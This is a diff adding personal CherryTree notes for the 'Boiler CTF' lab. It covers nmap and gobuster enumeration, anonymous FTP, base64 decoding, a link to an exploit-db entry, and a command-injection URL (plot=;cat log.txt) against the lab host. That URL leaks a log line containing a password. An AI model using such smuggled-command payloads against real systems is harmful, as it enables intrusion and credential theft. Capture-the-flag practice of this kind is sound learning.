@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Boiler CTF" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="8" is_bold="0" foreground="" ts_creation="1692594034" ts_lastsave="1692600935">
+    <rich_text weight="heavy">Eumeration</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">nmap scan</rich_text>
+    <rich_text>
+				nmap -sC -sV -vv -Pn -n -p- -T3 10.10.135.231
+
+		</rich_text>
+    <rich_text underline="single">ftp anon</rich_text>
+    <rich_text>
+				ftp 10.10.135.231 21
+		
+		</rich_text>
+    <rich_text underline="single">enmerating ciphers</rich_text>
+    <rich_text>
+				</rich_text>
+    <rich_text link="webs https://www.dcode.fr/rot-13-cipher">https://www.dcode.fr/</rich_text>
+    <rich_text>
+				
+		</rich_text>
+    <rich_text underline="single">directory enumeration</rich_text>
+    <rich_text>
+				gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.135.231">http://10.10.135.231</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z	
+				gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.135.231/joomla">http://10.10.135.231/joomla</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z
+				
+		d</rich_text>
+    <rich_text underline="single">ecoding base64</rich_text>
+    <rich_text>
+				echo V2hvcHNpZSBkYWlzeQo= | base64 -d
+		
+		</rich_text>
+    <rich_text underline="single">tar extraction</rich_text>
+    <rich_text>
+				tar -xvf sar2ascii.tar
+						
+				
+</rich_text>
+    <rich_text weight="heavy">Exploitation</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">ghdb search</rich_text>
+    <rich_text>
+				</rich_text>
+    <rich_text link="webs https://www.exploit-db.com/exploits/47204">https://www.exploit-db.com/exploits/47204</rich_text>
+    <rich_text>
+				</rich_text>
+    <rich_text link="webs http://10.10.135.231/joomla/_test/index.php?plot=;cat%20log.txt">http://10.10.135.231/joomla/_test/index.php?plot=;cat%20log.txt</rich_text>
+    <rich_text>
+				Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
+				
+		</rich_text>
+    <rich_text underline="single">ssh connection</rich_text>
+    <rich_text>
+				
+
+</rich_text>
+    <rich_text weight="heavy">Post Exploitation</rich_text>
+  </node>
+</cherrytree>
